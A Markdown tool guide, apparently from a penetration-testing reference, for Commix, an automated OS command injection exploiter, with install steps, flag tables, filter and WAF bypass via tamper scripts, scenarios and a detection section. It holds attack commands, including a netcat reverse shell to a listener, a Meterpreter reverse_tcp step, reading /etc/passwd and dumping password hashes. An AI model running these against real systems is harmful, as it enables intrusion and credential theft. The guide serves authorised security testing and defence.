---
title: "Commix"
category: "Initial Access"
tool_type: "Command Injection Exploitation"
mitre_attack: ["TA0001: Initial Access", "T1059: Command and Scripting Interpreter"]
difficulty: "Intermediate"
version: "4.1"
author: "Anastasios Stasinopoulos (@ancst)"
license: "GPLv3"
language: "Python"
install_method: "apt"
kali_package: "commix"
official_url: "https://commixproject.com"
github_url: "https://github.com/commixproject/commix"
---

# Commix — Automated Command Injection Exploitation

## 1. Introduction & Overview

### What Is Commix

Commix (short for **comm**and **i**njection e**x**ploiter) is an automated all-in-one OS command injection detection and exploitation tool. Written in Python, it automates the full lifecycle: detecting injectable parameters, selecting the optimal technique, and extracting results — all in a single run.

Unlike manual command injection testing where a tester must guess metacharacters, craft payloads, and handle encoding, commix handles the entire process. It supports both detection (proving a vulnerability exists) and exploitation (running arbitrary commands on the target).

### History

- **Created:** 2014 by Anastasios Stasinopoulos (@ancst)
- **License:** GPLv3
- **Language:** Python (2.6, 2.7, 3.x)
- **Current Version:** 4.1-stable (December 2025)
- **Repository:** 5.8k stars, 937 forks, 2,366 commits
- **Kali Package:** Included in `default`, `everything`, `large`, and `kali-tools-web` metapackages
- **Dependencies:** metasploit-framework, python3, unicorn-magic

Commix has been presented at multiple security conferences and is referenced in books, academic research papers, and security blog posts across the industry.

### When to Use

- Web application penetration testing where command injection is suspected
- Automated scanning of POST parameters, GET parameters, HTTP headers, cookies, JSON fields, and XML elements
- CTF challenges involving command injection on PHP, Python, Perl, Ruby, ASP.NET, JSP, or Node.js backends
- Security assessments requiring evidence of remote code execution (RCE)
- Testing Shellshock (CVE-2014-6271) vulnerabilities in CGI environments
- Exploitation scenarios requiring filter bypass or WAF evasion

### When NOT to Use

- **Network service exploitation** — commix targets web applications only, not network protocols
- **SQL injection** — use sqlmap for database-specific injection
- **File inclusion vulnerabilities** — use specialized LFI/RFI tools
- **Non-authorized testing** — always obtain written permission before testing

### Legal Considerations

Commix is a legitimate penetration testing tool used by security professionals worldwide. However, using it against systems without explicit written authorization is illegal under the Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and equivalent laws globally. Always operate under a signed rules-of-engagement document or bug bounty program scope.

### Key Concepts

| Concept | Definition |
|---------|-----------|
| **Command Injection** | Injecting OS commands into web application input that gets passed to a shell |
| **OS Command Injection** | A subset where the injected command is executed by the operating system shell |
| **Results-Based Injection** | Output is directly reflected in the HTTP response |
| **Blind Injection** | Output is not returned; detection relies on timing or side effects |
| **Semi-Blind Injection** | Output is written to a file or inferred via timing |
| **Filter Bypass** | Techniques to evade input validation, WAF, or sanitizer |
| **Tamper Scripts** | Commix modules that modify payloads to evade detection |

---

## 2. Installation & Setup

### Requirements

- Python 2.6+ or 3.x
- Root or sudo access (recommended for full functionality)
- Network access to the target web application
- Metasploit Framework (optional, for reverse shell integration)
- unicorn-magic (dependency)

### Installation Methods

**From Kali repositories (recommended):**

```bash
sudo apt update && sudo apt install commix
```

**From source (latest version):**

```bash
git clone https://github.com/commixproject/commix.git
cd commix
python3 commix.py --version
```

**Using pip:**

```bash
pip3 install commix
```

### Post-Installation Configuration

Commix requires no configuration file. All options are passed via command-line flags. Session data is stored in `~/.commix/` automatically.

### Verification

```bash
commix --version
```

Expected output:

```
v4.1-stable
```

```bash
commix -h
```

The `-h` flag prints the complete help menu with all available options, confirming the tool is operational.

---

## 3. Basic Usage

### First Run

The simplest invocation requires only a target URL with a vulnerable parameter:

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=whoami"
```

Commix will:
1. Connect to the target and verify the connection
2. Identify the injectable parameter (`cmd`)
3. Test all available injection techniques
4. Report which technique(s) succeed
5. Drop into an interactive pseudo-shell or execute a single command

### Essential Commands

**Basic GET-based exploitation:**

```bash
commix --url="http://192.168.1.100/dvwa/vulnerabilities/exec/?ip=127.0.0.1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low"
```

**Explanation:** Targets the DVWA command injection page with a valid session cookie. Commix auto-detects the injectable `ip` parameter and tests all techniques.

**POST-based exploitation:**

```bash
commix --url="http://192.168.1.100/dvwa/vulnerabilities/exec/" \
  --data="ip=127.0.0.1&Submit=Submit" \
  --cookie="PHPSESSID=abc123; security=low"
```

**Explanation:** Same target but sends data via POST method. The `--data` flag specifies the POST body.

**Execute a single command:**

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" \
  --os-cmd="id"
```

**Explanation:** Runs `id` on the target and exits. No interactive shell — useful for quick verification.

**JSON-based injection:**

```bash
commix --url="http://192.168.1.100/api/ping" \
  --data='{"addr":"127.0.0.1","name":"test"}'
```

**Explanation:** Commix automatically detects JSON content and targets the `addr` field for injection.

**XML-based injection:**

```bash
commix --url="http://192.168.1.100/api/ping" \
  --data='<?xml version="1.0"?><ping><addr>127.0.0.1</addr></ping>'
```

**Explanation:** Targets the `addr` element within an XML payload.

**Header-based injection (User-Agent):**

```bash
commix --url="http://192.168.1.100/scenarios/user-agent/ua(classic).php" \
  --level=3 \
  -p user-agent
```

**Explanation:** Tests injection through the User-Agent HTTP header. `--level=3` increases test coverage, `-p` specifies the injection point.

**Referer header injection:**

```bash
commix --url="http://192.168.1.100/scenarios/referer/referer(classic).php" \
  --level=3 \
  -p referer
```

**Explanation:** Tests the Referer header for injection vectors.

**Cookie-based injection:**

```bash
commix --url="http://192.168.1.100/scenarios/cookie/cookie(classic).php" \
  --level=2 \
  --cookie="addr=127.0.0.1"
```

**Explanation:** Tests the `addr` cookie value for command injection.

**GraphQL mutation injection:**

```bash
commix --url="http://192.168.1.100:5000/graphql" \
  --data='{"query":"mutation{importPaste(host:\"target.example.com\",port:80,path:\"/\",scheme:\"http\"){result}}"}'
```

**Explanation:** Targets a GraphQL mutation parameter for injection. Commix parses JSON and injects into the `host` field.

**Shellshock exploitation:**

```bash
commix --url="http://192.168.1.100/cgi-bin/status/" --shellshock
```

**Explanation:** Exploits CVE-2014-6271 Shellshock vulnerability in CGI scripts. The `--shellshock` flag activates the dedicated module.

**Alternative shell (Python):**

```bash
commix --url="http://192.168.1.100/debug.php" \
  --data="addr=127.0.0.1" \
  --alter-shell="Python"
```

**Explanation:** Uses Python as the shell environment instead of bash/sh. Useful when the target has limited shell support.

### Flags Reference Table

#### General Options

| Flag | Description | Default |
|------|-------------|---------|
| `-v VERBOSE` | Verbosity level (0-4) | 0 |
| `--version` | Show version and exit | — |
| `--output-dir=DIR` | Custom output directory | `~/.commix/output` |
| `-s SESSION_FILE` | Load session from stored `.sqlite` file | — |
| `--flush-session` | Flush session files for current target | — |
| `--ignore-session` | Ignore results stored in session | — |
| `-t TRAFFIC_FILE` | Log all HTTP traffic to a file | — |
| `--time-limit=SECS` | Run with a time limit (e.g., 3600) | — |
| `--batch` | Never ask for user input | — |
| `--skip-heuristics` | Skip heuristic detection | — |
| `--codec=CODEC` | Force character encoding (e.g., 'ascii') | — |
| `--charset=CHARSET` | Time-related injection charset | `0123456789abcdef` |
| `--check-internet` | Check internet before assessing target | — |
| `--answers=ANSWERS` | Set predefined answers (e.g., 'quit=N') | — |

#### Target Options

| Flag | Description | Required |
|------|-------------|----------|
| `-u URL, --url=URL` | Target URL | Yes (or `-r`, `-m`, `-l`) |
| `--url-reload` | Reload target URL after command execution | No |
| `-l LOGFILE` | Parse target from HTTP proxy log | No |
| `-m BULKFILE` | Scan multiple targets from file | No |
| `-r REQUESTFILE` | Load HTTP request from file | No |
| `--crawl=DEPTH` | Crawl website from target URL | 1 |
| `--crawl-exclude=PAT` | Regexp to exclude pages from crawling | — |
| `-x SITEMAP_URL` | Parse targets from remote sitemap | — |
| `--method=METHOD` | Force HTTP method (e.g., PUT) | — |

#### Request Options

| Flag | Description |
|------|-------------|
| `-d DATA, --data=DATA` | POST data string |
| `--host=HOST` | HTTP Host header |
| `--referer=REFERER` | HTTP Referer header |
| `--user-agent=AGENT` | Custom User-Agent header |
| `--random-agent` | Randomly selected User-Agent |
| `--param-del=PDEL` | Character for splitting parameter values |
| `--cookie=COOKIE` | HTTP Cookie header |
| `--cookie-del=CDEL` | Character for splitting cookie values |
| `--http1.0` | Force HTTP/1.0 protocol |
| `-H HEADER, --header=HDR` | Extra header (e.g., 'X-Forwarded-For: 127.0.0.1') |
| `--headers=HEADERS` | Multiple extra headers (newline-separated) |
| `--proxy=PROXY` | Proxy to connect to target (e.g., 127.0.0.1:8080) |
| `--tor` | Use Tor network |
| `--tor-port=PORT` | Tor proxy port (default 8118) |
| `--auth-url=URL` | Login panel URL |
| `--auth-data=DATA` | Login parameters |
| `--auth-type=TYPE` | HTTP auth type (Basic, Digest, Bearer) |
| `--auth-cred=CREDS` | Auth credentials (e.g., 'admin:admin') |
| `--abort-code=CODE` | Abort on HTTP error codes |
| `--ignore-code=CODE` | Ignore HTTP error codes |
| `--force-ssl` | Force SSL/HTTPS |
| `--ignore-proxy` | Ignore system proxy settings |
| `--ignore-redirects` | Ignore redirection attempts |
| `--timeout=SECS` | Connection timeout (default 30) |
| `--retries=NUM` | Retries on timeout (default 3) |
| `--drop-set-cookie` | Ignore Set-Cookie header |

#### Enumeration Options

| Flag | Description |
|------|-------------|
| `--all` | Retrieve everything |
| `--current-user` | Current user name |
| `--hostname` | Current hostname |
| `--is-root` | Check root privileges |
| `--is-admin` | Check admin privileges |
| `--sys-info` | System information |
| `--users` | System users |
| `--passwords` | User password hashes |
| `--privileges` | User privileges |
| `--ps-version` | PowerShell version |

#### File Access Options

| Flag | Description |
|------|-------------|
| `--file-read=FILE` | Read a file from the target |
| `--file-write=FILE` | Write to a file on the target |
| `--file-upload=FILE` | Upload a file on the target |
| `--file-dest=FILE` | Absolute filepath on the host |

#### Injection Options

| Flag | Description |
|------|-------------|
| `-p PARAM` | Testable parameter(s) |
| `--skip=PARAMS` | Skip testing for given parameter(s) |
| `--suffix=SUFFIX` | Injection payload suffix |
| `--prefix=PREFIX` | Injection payload prefix |
| `--technique=TECH` | Injection technique(s) to use |
| `--skip-technique=TECH` | Technique(s) to skip |
| `--maxlen=LEN` | Max output length for time-based (default 10000) |
| `--delay=SECS` | Delay between HTTP requests |
| `--time-sec=SECS` | Seconds to delay OS response (default 5) |
| `--tmp-path=PATH` | Web server temp directory |
| `--web-root=PATH` | Web server document root |
| `--alter-shell=SHELL` | Alternative os-shell (e.g., 'Python') |
| `--os-cmd=CMD` | Execute a single OS command |
| `--os=OS` | Force backend OS ('Windows' or 'Unix') |
| `--tamper=SCRIPT` | Tamper script(s) for payload evasion |
| `--msf-path=PATH` | Local Metasploit installation path |

#### Detection Options

| Flag | Description | Default |
|------|-------------|---------|
| `--level=LEVEL` | Test level (1-3) | 1 |
| `--skip-calc` | Skip mathematic calculation in detection | — |
| `--skip-empty` | Skip parameters with empty values | — |
| `--failed-tries=NUM` | Failed tries for file-based technique | — |
| `--smart` | Thorough tests only if positive heuristics | — |

#### Miscellaneous Options

| Flag | Description |
|------|-------------|
| `--ignore-dependencies` | Ignore third-party library dependencies |
| `--list-tampers` | Display available tamper scripts |
| `--alert=CMD` | Run host OS command when injection found |
| `--no-logging` | Disable logging to file |
| `--purge` | Safely remove all commix data |
| `--skip-waf` | Skip WAF/IPS heuristic detection |
| `--mobile` | Imitate smartphone via User-Agent |
| `--offline` | Work in offline mode |
| `--wizard` | Simple wizard for beginners |
| `--disable-coloring` | Disable console output coloring |

---

## 4. Intermediate Usage

### Tamper Scripts

Commix includes built-in tamper scripts that modify payloads to evade input filters and WAFs. List them all:

```bash
commix --list-tampers
```

Key tamper scripts and their use cases:

| Tamper | Purpose |
|--------|---------|
| `base64encode` | Base64-encode payloads |
| `space2ifs` | Replace spaces with `$IFS` |
| `space2htab` | Replace spaces with horizontal tabs |
| `uninitializedvariable` | Insert uninitialized shell variables between characters |

**Bypass no-space filter:**

```bash
commix --url="http://192.168.1.100/scenarios/filters/no_space.php" \
  --data="addr=127.0.0.1" \
  --tamper="space2ifs"
```

**Explanation:** The `space2ifs` tamper replaces literal spaces with the shell's Internal Field Separator (`$IFS`), which expands to whitespace at execution time but bypasses simple space-stripping filters.

**Bypass command name blacklisting:**

```bash
commix --url="http://192.168.1.100/scenarios/filters/multiple_os_commands_blacklisting.php" \
  --data="addr=127.0.0.1" \
  --tamper="uninitializedvariable"
```

**Explanation:** The `uninitializedvariable` tamper inserts empty shell variables (e.g., `${AB}`) between characters of blocked command names, so keyword detection fails while the shell still executes the command.

### Filter Bypass Techniques

**Domain-name validation bypass (suffix trick):**

```bash
commix --url="http://192.168.1.100/scenarios/filters/lax_domain_name.php" \
  --data="addr=127.0.0.1" \
  --suffix="d.e.f"
```

**Explanation:** When the filter only allows domain-like characters (letters, digits, dots, hyphens), commix appends a suffix like `d.e.f` to make the payload look like a valid domain name.

**Nested quotes bypass:**

```bash
commix --url="http://192.168.1.100/scenarios/filters/nested_quotes.php" \
  --data="addr=127.0.0.1" \
  --level=3
```

**Explanation:** Level 3 testing enables advanced payload crafting with escape sequences that break out of multiple nested quote layers.

**File-based technique with custom web root:**

```bash
commix --url="http://192.168.1.100/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand.php" \
  --data="addr=127.0.0.1" \
  --technique=f \
  --web-root="/var/www/html/" \
  --tamper="space2htab"
```

**Explanation:** When all shell metacharacters are blocked, the file-based technique (`--technique=f`) writes payloads to a file and executes them, bypassing character restrictions entirely.

### Scripting and Automation

**Bulk scanning from file:**

```bash
commix -m targets.txt --batch --output-dir=/tmp/commix-results
```

**Explanation:** `targets.txt` contains one URL per line. `--batch` skips all interactive prompts, using default answers. Results are saved to a custom output directory.

**Parsing Burp Suite proxy log:**

```bash
commix -l burp_log.txt --batch
```

**Explanation:** Commix parses a Burp Suite HTTP proxy log file, extracts URLs and parameters, and tests each for injection.

**Using with Tor for anonymization:**

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" --tor --tor-port=9050
```

**Explanation:** Routes all traffic through Tor for anonymity. Requires Tor to be running on the specified port.

### Tool Chaining

**Commix + Metasploit (reverse shell):**

After gaining an interactive shell via commix, use the pseudo-shell's `reverse_tcp` option to get a Metasploit-compatible Meterpreter session:

```
commix(os_shell) > reverse_tcp
```

**Commix + Netcat (manual exfil):**

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" \
  --os-cmd="nc 192.168.1.200 4444 -e /bin/sh"
```

**Explanation:** Executes a reverse shell from the target to your listener using netcat.

---

## 5. Advanced Usage

### Custom Injection with Prefix/Suffix

When you know the exact injection context but commix's automatic detection fails:

```bash
commix --url="http://192.168.1.100/vuln.php?type=test" \
  --prefix="'" \
  --suffix="//"
```

**Explanation:** The prefix wraps the payload in a single quote to close the existing string, and the suffix adds `//` to comment out trailing code.

### Forced OS Detection

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" --os="Windows"
```

**Explanation:** When heuristic detection fails to identify the backend OS, force it to use Windows-specific payloads (e.g., `cmd.exe` commands instead of `/bin/sh`).

### Crawl and Exploit

```bash
commix --url="http://192.168.1.100/" --crawl=2 --crawl-exclude="logout"
```

**Explanation:** Commix crawls the website starting from the root, testing all discovered parameters at depth 2, while skipping pages matching "logout".

### WebSocket Exploitation

```bash
# First, run HTTP-to-WebSocket proxy
python HTTP2WebSocket.py -l 3333 -t ws://target.local:8080

# Then exploit via the proxy
commix --url="http://127.0.0.1:3333/command-execution" \
  --data="addr=127.0.0.1"
```

**Explanation:** When a vulnerable backend is only accessible via WebSocket, bridge it with an HTTP-to-WebSocket proxy and target the proxy endpoint.

### Session Management

**Save and resume a session:**

```bash
# First run — session is saved automatically
commix --url="http://192.168.1.100/vuln.php?cmd=test"

# Resume later
commix -s ~/.commix/output/<target>/session.sqlite --flush-session
```

**Explanation:** Session files store all discovered information, avoiding redundant testing on subsequent runs.

### Time-Limited Execution

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" \
  --time-limit=3600 \
  --batch
```

**Explanation:** Runs for a maximum of 3600 seconds (1 hour), then stops. Useful for automated assessments with strict time windows.

---

## 6. Real-World Scenarios

### Scenario 1: Enterprise Web Application Audit

A company's internal tool at `https://intranet.target.example.com/tools/ping` accepts an IP address parameter. The security assessment requires proving RCE.

**Step 1 — Verify injection:**

```bash
commix --url="https://intranet.target.example.com/tools/ping" \
  --data="ip=127.0.0.1" \
  --cookie="JSESSIONID=abc123" \
  --batch
```

**Step 2 — Enumerate if injection found:**

```bash
commix --url="https://intranet.target.example.com/tools/ping" \
  --data="ip=127.0.0.1" \
  --cookie="JSESSIONID=abc123" \
  --all --batch
```

**Step 3 — Extract sensitive files:**

```bash
commix --url="https://intranet.target.example.com/tools/ping" \
  --data="ip=127.0.0.1" \
  --cookie="JSESSIONID=abc123" \
  --file-read="/etc/passwd" --batch
```

### Scenario 2: CTF Challenge — Filtered Command Injection

A CTF web challenge strips semicolons, pipes, and ampersands from input. The vulnerable parameter is `query` on a Python Flask backend.

```bash
commix --url="http://192.168.1.50:5000/search" \
  --data="query=test" \
  --technique=T \
  --alter-shell="Python" \
  --batch
```

**Explanation:** Since classic injection is blocked, use time-based technique (`T`) with Python as the alternative shell to bypass the filter.

### Scenario 3: Bug Bounty — Header Injection on PHP Application

A bug bounty target echoes User-Agent in logs and a debug page. Testing reveals the User-Agent is passed to `shell_exec()` in a PHP script.

```bash
commix --url="http://target.example.com/debug" \
  --level=3 \
  -p user-agent \
  --random-agent \
  --batch \
  --output-dir=/tmp/bb-results
```

**Explanation:** Level 3 tests header injection vectors. Random User-Agent prevents fingerprinting. Results are saved for reporting.

### Scenario 4: Shellshock on Legacy CGI Server

An outdated Apache server runs CGI scripts that use Bash. CVE-2014-6271 testing is required.

```bash
commix --url="http://192.168.1.100/cgi-bin/status" \
  --shellshock \
  --batch
```

**Explanation:** The `--shellshock` flag activates the dedicated Shellshock module that injects payloads through HTTP headers into Bash environment variables.

---

## 7. Detection & Defense

### How to Detect Commix Usage

Commix traffic can be identified by:

1. **Heuristic probe patterns** — commix sends initial test payloads with mathematical calculations (e.g., `set /a (49+1)`) to confirm injection
2. **Repeated similar requests** — automated testing generates many requests to the same endpoint with varying payloads
3. **Unusual User-Agent strings** — default commix User-Agent is distinctive
4. **Session file creation** — `.sqlite` files appear in `~/.commix/output/`

### WAF Signature Detection

Most WAFs detect common command injection patterns:

```
# Snort/Suricata signatures
alert http any any -> any any (msg:"COMMIX Command Injection"; content:"commix"; sid:1000001; rev:1;)
alert http any any -> any any (msg:"CMD Injection - Semicolon"; content:";"; pcre:"/;\s*(id|whoami|cat|ls)/i"; sid:1000002; rev:1;)
```

### Mitigation Strategies

1. **Never pass user input to shell commands** — use language-native APIs instead of `system()`, `exec()`, `shell_exec()`, `passthru()`
2. **Input validation** — whitelist allowed characters, reject metacharacters
3. **Least privilege** — run web servers as unprivileged users without shell access
4. **WAF rules** — deploy rules blocking common injection patterns
5. **Output encoding** — sanitize output displayed to users
6. **Code review** — audit all user input touching system calls

### Recommended Detection Tools

- **OSSEC/Suricata** — monitor for command injection patterns
- **ModSecurity** — OWASP CRS includes command injection rules
- **Log analysis** — monitor web server access logs for unusual parameters

---

## 8. Troubleshooting

### Common Errors

**"Connection refused" or timeout:**

```bash
# Test connectivity first
curl -v http://192.168.1.100/vuln.php?cmd=test
# Increase timeout
commix --url="http://192.168.1.100/vuln.php?cmd=test" --timeout=60
```

**"No parameter to test" error:**

Ensure parameters are properly identified. Use `-p` to explicitly specify testable parameters or increase `--level` to 3.

**Heuristics fail to identify OS:**

Force the OS with `--os="Windows"` or `--os="Unix"`.

**"Permission denied" on file operations:**

File-based injection requires writable directories. Use `--tmp-path=/tmp` to specify an alternative:

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" \
  --technique=f --tmp-path=/tmp
```

**SSL certificate errors:**

Use `--force-ssl` or `--ignore-proxy` flags.

**Slow time-based injection:**

Time-based techniques are inherently slow. Reduce `--time-sec` to speed up testing (default 5 seconds):

```bash
commix --url="http://192.168.1.100/vuln.php?cmd=test" --technique=T --time-sec=3
```

### FAQ

**Q: Does commix support Windows targets?**
A: Yes. Use `--os="Windows"` to force Windows payloads including `cmd.exe` and PowerShell commands.

**Q: Can commix exploit Blind SQL Injection?**
A: No. Use sqlmap for SQL injection. Commix is dedicated to OS command injection.

**Q: How do I bypass WAF with commix?**
A: Combine `--tamper=uninitializedvariable` with `--random-agent` and `--delay=1` to slow requests. The file-based technique (`--technique=f`) often bypasses WAFs entirely.

**Q: What Python version is required?**
A: Python 2.6, 2.7, or 3.x. Python 3 is recommended.

---

## Resources

- [Commix Official Wiki](https://github.com/commixproject/commix/wiki)
- [Usage Examples](https://github.com/commixproject/commix/wiki/Usage-Examples)
- [Filters Bypass Guide](https://github.com/commixproject/commix/wiki/Filters-Bypasses)
- [Injection Techniques](https://github.com/commixproject/commix/wiki/Techniques)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [MITRE ATT&CK T1059](https://attack.mitre.org/techniques/T1059/)
- [Commix Testbed (Docker)](https://hub.docker.com/repository/docker/commixproject/commix-testbed)
- [Kali Package Page](https://www.kali.org/tools/commix/)
